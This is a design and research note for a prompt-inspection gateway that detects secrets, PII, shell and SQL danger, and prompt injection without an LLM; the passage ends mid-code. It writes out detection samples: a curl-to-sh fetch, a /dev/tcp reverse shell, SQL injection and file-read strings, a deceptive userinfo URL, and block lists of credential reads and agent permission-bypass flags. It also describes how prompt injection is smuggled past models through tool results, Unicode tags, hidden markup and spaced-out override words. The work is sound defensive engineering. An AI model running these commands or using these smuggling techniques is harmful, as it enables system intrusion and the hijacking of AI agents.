# 04 - Deterministic detection: how do we find secrets, PII, injections and dangerous content without an LLM, fast, and redact precisely?

Verified 2026-10-03 against primary sources. Legend: `[EST]` established technique, `[EXP]` experimental / research-grade, `[REC]` our architectural recommendation, `[INFERENCE]` reasoning not read anywhere, `[MEASURED]` run locally today.
`[MEASURED]` = Apple arm64 laptop (shared, +-2x noise), Python 3.14.8, throw-away uv venvs, p50 of 50-200 calls; corpora = package METADATA prose (1 KB / 10 KB) and `argparse.py` code (10 KB) with one injected PII/secret line. Code blocks are the tested versions (public vectors pass, offset round-trips pass, streaming equals one-shot redaction over 900 random chunkings). Prior notes reused with links: `ai_layer_control/research/01, 02, 04, 10`.

## 1. Prompt inspection pipeline

Flow: `0 ingest+caps -> 1 normalize -> 2 context -> 3 static -> 4 secrets/PII -> 5 injection -> 6 semantic (gray zone only) -> 7 policy -> ALLOW | LOG | WARN | REDACT | REQUIRE_APPROVAL | BLOCK`.

| # | Stage: in -> out (shared once) | Short-circuit | p95 / fail mode |
|---|---|---|---|
| 0 | ingest: body -> `Part[]` (role, channel, json path, text); JSON and `arguments` parsed once | > 1 MiB BLOCK 413; bad UTF-8 -> `replace` + flag | 2 ms, closed |
| 1 | normalize: text -> `View` (offset map), `dlp_text`, `inj_text`, flags, `Variant[]`, cached on the part | flags only; `decode_bomb` is a signal | 5 ms / 10 KB, closed |
| 2 | enrich: key, user, agent, tool, channel, taint -> `Ctx`; `policy_version` pinned per request | unknown tool/model/host denied before scanning | 1 ms, closed |
| 3 | static: `url, sql, shell, yara, embedded_binary, hidden_markup` (one parse per URL/command) | - | 3 ms; closed on tool channels, open+flag on chat |
| 4 | secrets + PII: `Span(start,end,type,detector,score,prio)`; one AC keyword pass feeds all regexes | BLOCK-type secret skips 6 | 5 ms / 10 KB, closed |
| 5 | injection: signals from `inj_text` + despaced/de-leeted/rot13 variants, noisy-OR score | `s >= block` -> BLOCK, skip 6 | 3 ms; closed on tool_result, open+flag on user |
| 6 | semantic (other slice) | only if `lo <= s < hi`, or untrusted channel and `s >= semantic_min` | 300-500 ms `asyncio.timeout`, `on_timeout` per channel |
| 7 | policy: findings + `Ctx` -> `Verdict{action, reasons, redactions, policy_version}` | first matching rule | 1 ms, closed (deny) |

Precedence `BLOCK > REQUIRE_APPROVAL > REDACT > WARN > LOG > ALLOW`; REDACT still applies under a BLOCK verdict; audit stores `type, start, end, sha256[:8]`, never values. `[INFERENCE]` A CPU-bound RE2 call cannot be pre-empted, but RE2 is linear: bound the input (256 KB per part, head 192 + tail 64, flag `truncated`, `on_truncated: block|allow+flag`), check `time.monotonic()` between detectors, timeout only the semantic call.

### 1.2 Parts scanned and channel trust
`trusted_config` (system/developer): secrets ([LLM07](https://genai.owasp.org/llmrisk/llm072025-system-prompt-leakage/)), canary registration. `user`: everything (images: type + size only). Client-replayed assistant history: `model_output`. `tool_result` (untrusted): `role=tool`, MCP `result.content[]` **and** `structuredContent` ([MCP 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28/server/tools)): strictest thresholds, hidden markup. `tool_call`: `tool_calls[].function.arguments` (JSON string), MCP `params.arguments`; scan string leaves by JSON path (`command` -> shell, `query` -> SQL). `tool_meta`: `tools[]`, `tools/list` (annotations "MUST be considered untrusted", same spec). `rag`: indistinguishable from user text unless tagged (`X-AICL-Channel` / `metadata.aicl.channel`, default `user` `[REC]`). `model_output`: section 7.

User text with instructions is a request; the same text in a tool result or RAG chunk is an attack ([MSRC](https://www.microsoft.com/en-us/msrc/blog/2025/07/how-microsoft-defends-against-indirect-prompt-injection-attacks): all attacker-controlled input is the surface; [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/): indirect injection, obfuscation). Thresholds `[REC]`, to tune on the benign corpus:
```yaml
channels:   # s = injection score, noisy-OR of signals (6.4)
  user:        {warn: 0.50, block: 0.90, semantic_band: [0.30, 0.90], on_semantic_timeout: allow_flag}
  tool_result: {warn: 0.30, block: 0.60, semantic_band: [0.15, 0.60], on_semantic_timeout: block}   # rag, tool_meta: same or stricter
  tool_call:   {injection: ignore, shell: block_pipe_to_interpreter, sql: approve_destructive}
dlp: {secrets: {user: REDACT, tool_result: REDACT, tool_call: BLOCK, model_output: REDACT}, pii: {all: REDACT}, pii_min_score: 0.8}
```
A redacted credential in a tool call leaves the agent acting with a broken secret, so tool_call secrets default to BLOCK.

## 2. Pattern catalogue (RE2-compatible)

RE2 limits found `[MEASURED]` (google-re2 1.1.20251105): no lookaround/backrefs; **repetition max 1000** (`{1,1001}` -> `invalid repetition size`); large bounded repeats like `[^>]{0,500}?` exhaust the DFA budget (`DFA out of memory`, NFA fallback, still linear; keep <= 200); **`\b` is ASCII-only**: `\bkot\b` matches inside `kotł` (stdlib `re` does not), so Polish words need `(?:^|[^\pL\pN_])w(?:$|[^\pL\pN_])`. [RE2 syntax](https://github.com/google/re2/wiki/Syntax).
`[gl]` = gitleaks `config/gitleaks.toml` (MIT; 222 rules, 221 with regex, minVersion 8.25.0, read 2026-10-03), `[own]` = ours. Group 1 is the redacted span. All compile in RE2 and pass the vectors in 2.3.

### 2.1 Secrets
| Id | RE2 regex | Validator | Score | Source |
|---|---|---|---|---|
| AWS_ACCESS_KEY_ID | `\b((?:AKIA\|ASIA\|ABIA\|ACCA\|A3T[A-Z0-9])[A-Z2-7]{16})\b` | - | .90 | [AWS IAM](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_identifiers.html): AKIA access key, ASIA STS temp, ABIA STS bearer, ACCA context credential; `A3T`, `[A-Z2-7]` `[gl]`. AGPA, AIDA, AIPA, ANPA, ANVA, APKA, AROA, ASCA are resource ids: LOG |
| AWS_SECRET_KEY | `(?i)aws[\w .-]{0,30}?(?:secret\|sk)[\w .-]{0,20}?["']?\s*[:=]\s*["']?([A-Za-z0-9/+=]{40})\b` | H >= 4.0 | .85 (.95 with a key id within 200 chars) | `[own]` |
| GITHUB_TOKEN | `\b(gh[pousr]_[A-Za-z0-9]{36,251}\|github_pat_[A-Za-z0-9]{22}_[A-Za-z0-9]{59})\b` | **CRC32** (2.4) | .95 | [GitHub](https://github.blog/engineering/platform-security/behind-githubs-new-authentication-token-formats/) ghp gho ghu ghs ghr |
| GITLAB_TOKEN | `\b(gl(?:pat\|oas\|dt\|rt\|rtr\|cbt\|ptt\|ft\|imt\|agent\|wt\|soat\|ffct)-[A-Za-z0-9_-]{20,})` | - | .90 | [GitLab docs](https://docs.gitlab.com/security/tokens/) (gitleaks: `glpat-` only) |
| SLACK_TOKEN | `\b(xox[abposre]-[A-Za-z0-9-]{10,}\|https://hooks\.slack\.com/(?:services\|workflows\|triggers)/[A-Za-z0-9+/]{43,56}\|xapp-\d-[A-Za-z0-9]+-\d+-[A-Za-z0-9]+\|xwfp-[A-Za-z0-9-]{10,})` | - | .90 | [Slack](https://docs.slack.dev/authentication/tokens/) |
| STRIPE_SECRET | `\b((?:sk\|rk)_(?:live\|test\|prod)_[A-Za-z0-9]{10,99})\b` | - (`pk_live_`: LOG) | .95 | `[gl]` |
| GOOGLE_API_KEY | `\b(AIza[\w-]{35})\b` | H >= 3.0 | .90 | `[gl]` |
| OPENAI_KEY | `\b(sk-(?:proj\|svcacct\|admin)-[A-Za-z0-9_-]{40,200}\|sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20})` | - | .90 | `[gl]`, loosened |
| ANTHROPIC_KEY | `\b(sk-ant-[a-z0-9]{3,10}-[A-Za-z0-9_-]{80,200})` | - | .95 | `[gl]`, loosened |
| HF_TOKEN | `\b((?:hf\|api_org)_[A-Za-z]{34})\b` | H >= 3.0 | .85 | `[gl]` |
| JWT | `\b(ey[A-Za-z0-9_-]{10,}\.ey[A-Za-z0-9_/\\-]{10,}\.[A-Za-z0-9_/\\-]{10,}={0,2})` | header JSON has `alg` ([RFC 7519](https://datatracker.ietf.org/doc/html/rfc7519)) | .90 | `[gl]` |
| PRIVATE_KEY | `(?s)(-----BEGIN (?:[A-Z0-9]+ )*PRIVATE KEY(?: BLOCK)?-----.{40,}?(?:-----END (?:[A-Z0-9]+ )*PRIVATE KEY(?: BLOCK)?-----\|$))` | - | .99 | [RFC 7468](https://datatracker.ietf.org/doc/html/rfc7468) |
| PASSWORD_ASSIGN | `(?i)\b(?:password\|passwd\|pwd\|passphrase\|secret\|client_secret\|api[_-]?key\|access[_-]?token\|auth[_-]?token)\b["']?\s*(?::=\|=>\|[:=])\s*["']?([^\s"',;<>${}]{6,128})` | not stoplisted (`changeme example password xxx+ **** your_* todo null true false redacted dummy test`) | .60 | `[own]` |
| DB_URL / BASIC_AUTH_URL (any `scheme://user:pass@host`; DB schemes first: `postgres(ql) mysql mariadb mongodb(+srv) redis rediss amqp(s) mssql clickhouse ldap(s) smb s?ftp jdbc:*`) | `\b(?:postgres(?:ql)?\|mysql\|mariadb\|mongodb(?:\+srv)?\|redis\|rediss\|amqps?\|mssql\|clickhouse\|ldaps?\|smb\|s?ftp\|jdbc:[a-z0-9]+)://[^\s:/@]{1,64}:([^\s@/]{3,128})@[^\s/]{1,255}`; generic: `\b[a-z][a-z0-9+.-]{1,20}://[^\s:/@]{1,64}:([^\s@/]{3,128})@[A-Za-z0-9.-]{1,255}` | - | .95 / .90 | `[own]`, password group only |

Import the other `[gl]` rules by script (Bedrock `ABSK...`, PyPI, `npm_`, `SG\.`, `dop_v1_`, `pplx-`, curl `-H/-u`).

### 2.2 PII and identifiers
| Id | RE2 candidate | Validator | Score |
|---|---|---|---|
| CREDIT_CARD | `\b(\d(?:[ -]?\d){11,18})\b` | Luhn + IIN/length ([Wikipedia](https://en.wikipedia.org/wiki/Payment_card_number): Visa 4, MC 51-55/2221-2720, Amex 34/37, Discover 6011/644-649/65, JCB 3528-3589, Diners 300-305/36/38/39, UnionPay 62) + not one repeated digit | .90 |
| IBAN | `\b([A-Z]{2}\d{2}(?: ?[A-Z0-9]{4}){2,7}(?: ?[A-Z0-9]{1,4})?)` | longest prefix with mod-97 = 1 (greedy regex overshoots: `...2874 PESEL` matched 34 chars); `PL` = `PL\d{26}` ([IBAN](https://en.wikipedia.org/wiki/International_Bank_Account_Number); PL 28 chars: [Compensa](https://www.compensa.pl/blog/numer-iban-co-to-jest-i-do-czego-jest-potrzebny)) | .95 |
| PL_NRB (no `PL`) | `\b(\d{2}(?: ?\d{4}){6})\b` | mod-97 on `"PL"+v` | .85 |
| PL_PESEL | `\b(\d{11})\b` | weights 1,3,7,9,1,3,7,9,1,3, check `(10-sum%10)%10` (as [Presidio](https://github.com/data-privacy-stack/presidio/blob/main/presidio-analyzer/presidio_analyzer/predefined_recognizers/country_specific/poland/pl_pesel_recognizer.py), which has no date check) **plus birth date**: month +80 = 1800s, +0 = 1900s, +20 = 2000s, +40 = 2100s, +60 = 2200s, then `datetime.date(...)` ([pl.wikipedia](https://pl.wikipedia.org/wiki/PESEL)) | .80 (.95 with word PESEL near) |
| PL_NIP | `\b((?:PL ?)?\d{3}[- ]?\d{3}[- ]?\d{2}[- ]?\d{2}\|(?:PL ?)?\d{3}[- ]?\d{2}[- ]?\d{2}[- ]?\d{3})\b` | weights 6,5,7,2,3,4,5,6,7 mod 11 = digit 10, remainder 10 invalid ([pl.wikipedia](https://pl.wikipedia.org/wiki/Numer_identyfikacji_podatkowej)) | .70 |
| PL_REGON | `\b(\d{14}\|\d{9})\b` | 9: weights 8,9,2,3,4,5,6,7 mod 11 (10 -> 0); 14: 2,4,8,5,0,9,7,3,6,1,2,4,8 ([pl.wikipedia](https://pl.wikipedia.org/wiki/REGON)); needs word `REGON` | .50 |
| PL_ID_CARD | `\b([A-Z]{3} ?\d{6})\b` | A=10..Z=35, weights 7,3,1,9,7,3,1,7,3, sum mod 10 = 0 (format only) ([pl.wikipedia](https://pl.wikipedia.org/wiki/Dow%C3%B3d_osobisty_w_Polsce)) | .75 |
| EMAIL | `\b([A-Za-z0-9._%+-]{1,64}@(?:[A-Za-z0-9-]{1,63}\.)+[A-Za-z]{2,24})\b` | not own-domain allowlist ([RFC 5321](https://www.rfc-editor.org/rfc/rfc5321) limits) | .90 |
| PHONE_E164 | `(?:^\|[^\w+])((?:\+\|00)[1-9]\d{0,2}(?:[\s().-]?\d){6,12})\b` | `phonenumbers.is_valid_number`, region PL | .80 |
| PHONE_PL | `(?:^\|[^\w])((?:\+48\|0048)?[\s-]?(?:\d{3}[\s-]\d{3}[\s-]\d{3}\|\d{2}[\s-]\d{3}[\s-]\d{2}[\s-]\d{2}))\b` | `phonenumbers` PL; bare 9 digits need a context word | .60 |
| IPV4 | `\b((?:(?:25[0-5]\|2[0-4]\d\|1?\d?\d)\.){3}(?:25[0-5]\|2[0-4]\d\|1?\d?\d))\b` | `ipaddress` class: loopback, link_local (169.254/16 incl. metadata), private ([RFC 1918](https://www.rfc-editor.org/rfc/rfc1918)), non_global (100.64/10), public | .70 |
| IPV6 | `(?:^\|[^\w:.])((?:[0-9A-Fa-f]{0,4}:){2,7}[0-9A-Fa-f]{0,4})(?:$\|[^\w:])` | `len>=3`, `ipaddress`, reject unspecified/multicast (stdlib calls `::` private) | .70 |
| INTERNAL_HOST | `(?i)\b((?:[a-z0-9-]{1,63}\.)+(?:internal\|corp\|local\|lan\|intranet\|home\.arpa\|localdomain))\b` + company domains in Aho-Corasick | `.local` [RFC 6762](https://www.rfc-editor.org/rfc/rfc6762), `home.arpa` [RFC 8375](https://www.rfc-editor.org/rfc/rfc8375), `.internal` [ICANN 2024-07-29](https://www.icann.org/en/board-activities-and-meetings/materials/approved-resolutions-special-meeting-of-the-icann-board-29-07-2024-en) | .70 |

### 2.3 Test vectors `[MEASURED]` (all pass)
`AKIAIOSFODNN7EXAMPLE` (AWS doc sample; **do not allowlist `...EXAMPLE` in demo mode**: gitleaks does, judges will paste it), `wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY` (H 4.66). PESEL `44051401458`, `44051401359` valid, `44023101451` (31 Feb) rejected. NIP `1234563218`, REGON `123456785`, ID card `ABA300000` valid. IBAN `PL61 1090 1014 0000 0712 1981 2874` valid (also as NRB; `...2875` not). Cards `4111 1111 1111 1111`, `378282246310005`, `5555555555554444`, `6011111111111117` valid, `1234 5678 9012 3456` not. IPv6 `2001:4860:4860::8888` hit, `std::vector` no hit.

### 2.4 GitHub token CRC32 `[MEASURED]`
`ghp_` + 30 random chars + 6-char checksum = CRC32 of the 30 chars, base62, zero-padded (blog: "32 bit checksum in the last 6 digits ... CRC32 ... Base62"; input and alphabet order not spelled out). Verified on the vectors of Datadog's Apache-2.0 [`github_token_checksum.rs`](https://github.com/DataDog/dd-sensitive-data-scanner/blob/main/sds/src/secondary_validation/github_token_checksum.rs).
`b62(n)` = base62 digits of `n` over `0-9A-Za-z`, left-padded with `0` to 6: `github_crc_ok(tok)` = `len(body) == 36 and b62(zlib.crc32(body[:30].encode())) == body[30:]` where `body = tok.split("_", 1)[1]`.
`ghp_` + 36 alphanumerics failing the CRC = placeholder: LOG (`github_crc: require|ignore`). No public checksum spec for `github_pat_`. No `python-stdnum` (LGPL 2.2): each checksum is 5 lines.

### 2.5 Default action per type `[REC]`
Secrets and card/IBAN/NRB/PESEL/ID card: REDACT in user/tool_result/model_output, **BLOCK in tool_call**. Password assignment, entropy findings: WARN, REDACT/BLOCK at >= .7. NIP, REGON, e-mail, phone: REDACT (own-domain e-mail LOG; PII present in the request is restored by the vault, 8.3). IP: private/loopback/link-local WARN (link-local/metadata BLOCK in tool_call: SSRF), public LOG. Internal host/URL: WARN, BLOCK in tool_call unless allowlisted.

## 3. Libraries on raw prompt text

Licence from LICENSE / PyPI / GitHub API, 2026-10-03; speeds `[MEASURED]` (1 KB / 10 KB p50).

| Library: version (date), licence | Facts | Verdict |
|---|---|---|
| [google-re2](https://pypi.org/project/google-re2/) 1.1.20251105 (2025-11-05), BSD-3 | arm64 wheels, runs on 3.14.8; 221 gitleaks rules in a loop 0.45 / 4.0 ms; `re2.Set` 2 / 32 us (ids only, needs `max_mem` >= 64 MB) | **USE**, only engine for feed regex |
| stdlib `re`; [`regex`](https://pypi.org/project/regex/) 2026.9.29 (Apache-2.0 AND CNRI-Python) | `re` compiles 199/221 gitleaks rules (inline `(?i)` mid-pattern fails), 6.6 / 80 ms; `regex` all 221, 3.3 / 37 ms, has `timeout=`; `(a+)+$` on `a*28+b`: `re` **11.2 s**, RE2 **0.09 ms** | internal fixed patterns only |
| [Hyperscan](https://github.com/intel/hyperscan) / [Vectorscan](https://github.com/VectorCamp/vectorscan) via [`hyperscan`](https://github.com/darvid/python-hyperscan) 0.8.2 (2026-03-19, MIT) | Vectorscan 5.4.13 (2026-08-23) BSD; Hyperscan last open 5.4.2 (2023-04-19), **>= 5.5 Intel proprietary** ([README](https://github.com/VectorCamp/vectorscan)); cp314 arm64 wheel; 216/221 compile (0.7 s), 9 / 82 us, no capture groups | **NOT RECOMMENDED FOR HACKATHON MVP: Hyperscan -> keyword prefilter + RE2** (13 / 189 us) |
| [ahocorasick-rs](https://pypi.org/project/ahocorasick-rs/) 1.0.3 (2025-10-08), Apache-2.0; [pyahocorasick](https://pypi.org/project/pyahocorasick/) 2.3.1 (2026-04-27), BSD-3 | cp314 wheels; 1000 keywords **6 / 61 us** vs 10 / 147 us | **USE** ahocorasick-rs |
| [gitleaks](https://github.com/gitleaks/gitleaks) v8.30.1 (2026-03-21), MIT | "feature complete"; successor [Betterleaks](https://github.com/betterleaks/betterleaks) MIT v1.9.0 (2026-09-29); `gitleaks stdin` exists but process per prompt is too slow | **REUSE RULES TOML** (regex, keywords, entropy, stopwords) |
| [Presidio](https://github.com/data-privacy-stack/presidio) 2.2.364 (2026-07-22), MIT | py 3.10-3.14; `NoOpNlpEngine` needs no model; 16 pattern recognizers **3.6 / 16.4 ms**; PL = `PL_PESEL` only; NoOp cannot use context words in text; default phone regions exclude PL | optional NER bridge only |
| [YARA-X](https://github.com/VirusTotal/yara-x) 1.21.0 (2026-09-29), BSD-3 | abi3 arm64 wheel (`yara-python` 4.5.4: arm64 wheels only to cp313); 5 rules 0.8 / 6 us, compile ~1 ms | **USE** |
| [phonenumbers](https://pypi.org/project/phonenumbers/) 9.0.40 (2026-09-24), Apache-2.0; [sqlglot](https://pypi.org/project/sqlglot/) 30.21.0 (2026-09-30), MIT; [tree-sitter-bash](https://pypi.org/project/tree-sitter-bash/) 0.25.1 (2025-12-02), MIT; [nh3](https://pypi.org/project/nh3/) 0.3.7 (2026-08-23), MIT | matcher ~1.0 ms / 10 KB, validate 8 us; sqlglot parse + classify 99 us (import 41 ms); bash parse 13 us / command; nh3 10 KB 264 us | **USE** |
| [confusables.txt](https://www.unicode.org/Public/security/latest/confusables.txt) Unicode **18.0.0** (2026-08-06, UTS #39 rev 34), Unicode terms of use | 6712 mappings, **1857** non-ASCII -> one ASCII char; parse 7.6 ms; 10 KB `translate` 72 us; stdlib 3.14 `unicodedata` is Unicode **16.0.0** ([unicodedata2](https://pypi.org/project/unicodedata2/) 18.0.0 optional) | **own 15-line table**; `confusable-homoglyphs` (2024), `confusables` (2021), `homoglyphs` (2020) stale |
| **Rejected**: [detect-secrets](https://github.com/Yelp/detect-secrets) 1.5.0 (2024-05-06, Apache-2.0); [TruffleHog](https://github.com/trufflesecurity/trufflehog) v3.97.9 (**AGPL-3.0**); [bashlex](https://pypi.org/project/bashlex/) 0.18 (**GPL-3.0+**); [bleach](https://github.com/mozilla/bleach) 6.4.0; guesslang 2.2.1 (2021) | detect-secrets: **1027 hits on 10 KB of argparse.py**, 3.7 / 38 ms; TruffleHog verifies hits on live provider APIs (secret egress); bleach README: "**no longer maintained**, no future releases including for security issues"; guesslang pins `tensorflow==2.5.0` | do not use (copy detect-secrets entropy defaults only) |

Also: [Magika](https://pypi.org/project/magika/) 1.0.3 (Apache-2.0, optional); [secrets-patterns-db](https://github.com/mazen160/secrets-patterns-db) **CC-BY-SA-4.0** (1610 regexes, all compile in RE2): reference only. **keyword prefilter + RE2 13 / 189 us** (3-5 of 221 rules triggered; worst case 4 ms).

## 4. Entropy analysis

Defaults (source): **detect-secrets** ([source](https://github.com/Yelp/detect-secrets/blob/master/detect_secrets/plugins/high_entropy_strings.py)) base64 limit **4.5** over `A-Za-z0-9+/-_=`, hex limit **3.0** with all-digit penalty `H -= 1.2/log2(len)`. **gitleaks** ([config](https://github.com/gitleaks/gitleaks/blob/master/config/gitleaks.toml)): per-rule minimum entropy of the secret group; 130 of 221 regex rules set it: 1 (x1), 2 (x49), 2.75 (x1), 3 (x53), 3.5 (x8, incl. generic-api-key), 3.8 (x1), 4 (x14), 4.5 (x3); 91 rely on the prefix `[MEASURED]`. **TruffleHog** ([main.go](https://github.com/trufflesecurity/trufflehog/blob/main/main.go)): `--filter-entropy` unset by default ("Start with 3.0").

Measured entropy, bits/char `[MEASURED]`: uuid4 3.77; git sha1/sha256/md5 hex 3.86/3.81/3.65; random hex len 20/40/64 mean (p1) 3.37 (2.94) / 3.70 (3.39) / 3.82 (3.65); random base64 len 20/40 4.05 (3.68) / 4.78 (4.48); AWS doc sample secret 4.66; 57,905 English words (12-24 chars) mean 3.14, max 3.91; camelCase identifier 3.92; URL path with md5 id 4.16; minified JS 4.32; base64 of binary 5.36; password `Tr0ub4dor&3x` 3.42. Entropy is capped by `log2(len)` (20 hex chars: 4.32), so 4.5 for base64 means something only from ~32 chars; hashes/UUIDs (3.6-3.9) overlap random hex keys (3.3-3.8), so context decides; human passwords sit below every limit, only assignment syntax finds them. FP sources: UUIDs, git SHAs, `integrity` hashes, `data:image;base64,`, minified JS, identifiers, URL ids.

Scoring `[REC]` for a token >= 20 chars in `[A-Za-z0-9+/_=-]`: base .50 (non-hex, len >= 32, H >= 4.5) / .30 (non-hex, len >= 20, H >= 4.2) / .20 (hex, len >= 32, H >= 3.5); **+.40** keyword + assignment before it (`(key|secret|token|passw|credential|auth|bearer|api)...[:=]`); **+.50** known prefix; **-.50** hash context (`sha|hash|checksum|digest|integrity|commit|etag|uuid|;base64,`); **-.30** URL path; **-.40** identifier-like or 6 identical chars; UUID = 0. >= .70 REDACT, .40-.70 WARN/LOG; **entropy alone (max .50) never acts** (10 note). Keywords/allowlist: gitleaks `generic-api-key` verbatim.

## 5. Token and lexical analysis

### 5.1 Shell
tree-sitter-bash gives structure, not regex over raw text (13 us/command); `root.has_error` -> flag `shell_unparseable`, fall back to regexes. `[MEASURED]`: `curl -s http://x.example/s.sh | sh` -> `cmd:curl, cmd:sh, pipeline`; `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` -> `cmd:bash, redir`. Rules `[REC]`:
- pipeline ending in `sh bash zsh python perl ruby node` fed by `curl/wget/base64 -d/echo`: BLOCK tool_call, WARN text; redirect to `/dev/tcp/`, `/dev/udp/`, `nc/ncat/socat -e`: BLOCK.
- `rm -rf` on `/ ~ * $HOME`, `--no-preserve-root`, `mkfs`, `dd of=/dev/`, fork bomb: REQUIRE_APPROVAL (BLOCK strict). Reads of `~/.ssh`, `~/.aws/credentials`, `/etc/shadow`, `.env`: BLOCK with a network command in the pipeline, else WARN.
- `chmod +x` + exec, `crontab`, `sudo`, `powershell -enc`, `IEX`, `certutil -urlcache`: WARN / REQUIRE_APPROVAL. `claude --dangerously-skip-permissions`, `gemini --yolo`, `q chat --trust-all-tools` (s1ngularity, 04-signatures row 24): BLOCK.

N-grams: only the signature lexicon (word 1-4-grams from the 04-signatures seed datasets) in one Aho-Corasick automaton over `inj_text`, noisy-OR of phrase weights. Character n-gram language models are `[EXP]`: NOT RECOMMENDED FOR HACKATHON MVP -> common-word test (6.4).

### 5.2 SQL
Gate before parsing: field named `query/sql/statement`, a fenced `sql` block, or text starting with a statement keyword (`select insert update delete drop truncate alter create grant revoke merge copy exec`) plus a structural keyword. `[MEASURED]` sqlglot 30.21.0: `select the best option from the list` -> `ParseError`, but `Drop me a line and truncate the story` and `DROP the table users please` fall back to a generic `Command` node (FP): require a typed node (except `GRANT/REVOKE`). Per node of `sqlglot.parse(q, error_level=RAISE)`: type name + `_NO_WHERE` (`Delete/Update` without `where`) or `_DDL` (`Drop/TruncateTable/Alter`).
Measured: `1; DROP TABLE users;--` -> `[Literal, Drop_DDL, Semicolon]`; `DELETE FROM users` -> `Delete_NO_WHERE` (with `WHERE id=1`: `Delete`); `UPDATE accounts SET balance=0` -> `Update_NO_WHERE`; `TRUNCATE TABLE logs` -> `TruncateTable_DDL`; `COPY users TO PROGRAM '...'` -> `Copy` (match `PROGRAM` textually); `SELECT pg_read_file('/etc/passwd')` -> plain `Select` (function denylist `pg_read_file, lo_import, xp_cmdshell, load_file`); tautology `any(n.left == n.right for n in tree.find_all(exp.EQ))` True for `OR 1=1`. Actions: `*_NO_WHERE`, `*_DDL`, multi-statement -> REQUIRE_APPROVAL; read-only Select ALLOW; parse error on gated input WARN.

### 5.3 Code, URLs, encodings
- **Code**: fence tag, else Magika on blocks >= 150-400 B (10 note DLP-05).
- **URLs**: `urlsplit`; scheme in {http, https}; `userinfo` (`https://docs.corp.example@evil.example/`); `xn--` label -> IDNA decode + confusable skeleton vs allowlist; `ipaddress` rejects `0x7f.1`, but `socket.inet_aton` maps `0x7f.1`, `2130706433`, `0177.0.0.1`, `127.1` to 127.0.0.1 and `0xA9FEA9FE` to 169.254.169.254 `[MEASURED]`: classify that result; query >= 24 chars or a 32+ char base64/hex run = exfil shape. Allowlist = exact host or `.suffix` of the **parsed** host, never substring.
- **Base64/others**: rules in 6.3; sha256 hex and UUID yield no variant (tested). Binary results by magic bytes (`\x7fELF`, `MZ`, `\xcf\xfa\xed\xfe`, `PK\x03\x04`, `\x1f\x8b`, `%PDF`, pickle `\x80[\x02-\x05]`) -> `embedded_binary` (pickle BLOCK on tool channels). garak `encoding` probes ([encoding.py](https://github.com/NVIDIA/garak/blob/main/garak/probes/encoding.py)): Base64/16/32/2048, Ascii85, Hex, QP, UU, Mime, ROT13, Atbash, Braille, Morse, Nato, Ecoji, Zalgo, Leet, tag chars, variation selectors, SneakyBits. Decode the cheap ones; for the rest, raise the obfuscation signal when the text also says `decode`, `decrypt`, `rot13`, `zdekoduj`, `deszyfruj`.

## 6. Encoding and obfuscation

### 6.1 Attack -> detection -> handling
| Attack | Detect / handle (Source) |
|---|---|
| Unicode tags U+E0000-E007F (ASCII smuggling) | `[\U000e0020-\U000e007e]+`; strip, decode `chr(cp-0xE0000)` into a **variant**, rescan ([Embrace The Red](https://embracethered.com/blog/posts/2024/claude-hidden-prompt-injection-ascii-smuggling)) |
| Variation selectors U+FE00-FE0F, U+E0100-E01EF carrying bytes | strip + flag; payload decode `[EXP]` ([Paul Butler](https://paulbutler.org/2025/smuggling-arbitrary-data-through-an-emoji/); garak `InjectUnicodeVariantSelectors`) |
| Bidi controls U+202A-202E, 2066-2069, 200E/F, 061C | count in text without RTL script; strip + flag ([CVE-2021-42574](https://nvd.nist.gov/vuln/detail/CVE-2021-42574), [Trojan Source](https://trojansource.codes/)) |
| Zero-width/invisible U+00AD, 034F, 180B-180F, 200B-200F, 2060-206F, 3164, FEFF, FFA0 | strip, count; >= 3 inside words = signal (TR39 skeleton drops `Default_Ignorable_Code_Point` ([UTS #39](https://www.unicode.org/reports/tr39/))) |
| Homoglyphs (Cyrillic `о`, Greek `ρ`), fullwidth, ligatures | NFKC per non-ASCII chunk ([UAX #15](https://www.unicode.org/reports/tr15/)), then 1:1 confusables `translate`; mixed-script word = signal |
| ROT13/Caesar | common-word test 6.4; variant for injection scanners only (garak `InjectROT13`) |
| Spacing `i g n o r e`; leetspeak `1gn0re` | tokens `\b(?:[A-Za-z0-9][ ._\-*]){5,}[A-Za-z0-9]\b` -> despaced variant; tokens with letters and `[0-9@$!\|]` -> de-leet variant, matching only (`call 555-1234 at 10:30` unchanged, tested) |
| Hidden markdown/HTML comments, `display:none`, zero-size text | `<!--.{0,1000}?-->`, style regex; extract as variant, flag `hidden_markup` (garak `latentinjection` ([probes](https://github.com/NVIDIA/garak/tree/main/garak/probes))) |

**Do not use the full UTS #39 skeleton for matching**: its ASCII sources include `1 -> l`, `I -> l`, `0 -> O`, `| -> l`, `m -> rn` `[MEASURED from the 18.0.0 file]`, which corrupts digits, IDs and keys. `str.translate` over the non-ASCII -> single-ASCII subset keeps length, so one offset map serves both views. Polish `ł` maps to `l` + combining stroke (multi-char), so the diacritic fold is a separate 1:1 map; case folding and dropped diacritics apply to `inj_text` only (Bielik-Guard lists them as expected perturbations, [card](https://huggingface.co/speakleash/Bielik-Guard-0.1B-v1.1)).

### 6.2 Canonical order `[REC]`
1. bytes -> str (UTF-8 `replace`), size cap. 2. **Flag pass on the original** (invisibles, tags, bidi, script mix): normalization destroys the evidence. 3. NFKC for non-ASCII chunks only, if `not is_normalized`. 4. Strip invisibles (edit list keeps offsets). 5. 1:1 confusables `translate` -> **`dlp_text`** (case kept: secrets are case-sensitive). 6. `lower()` + 1:1 diacritic fold -> **`inj_text`**. 7. Variants (decoded blobs, tag payload, despaced, de-leeted, rot13) rescanned only by relevant scanners; DLP never runs on rot13/leet text. Whitespace collapse lives in the rules (`word\W{1,8}word`), so offsets survive.

### 6.3 Offset map and decode loop (tested)
Each destructive step is an edit `(a, b, repl)` over its parent; positions map back by bisecting the edit lists; a span strictly inside a replacement widens to the whole edit (a key with a zero-width space inside is redacted including it).
```python
# View = text + sorted non-overlapping edits (a, b, repl) over a parent text. Mapping back: bisect the edit lists; a position strictly
# inside a replacement widens to the whole edit; orig_span(a, b) walks parent links to the raw text (start side: ia, end side: ib).
def build_views(raw):
    flags = {}
    v = strip_invisibles(nfkc(View(raw), flags), flags)      # INVIS -> "", non-NFKC chunks -> expansion
    dlp = v.text.translate(CONF)                              # 1:1, case kept
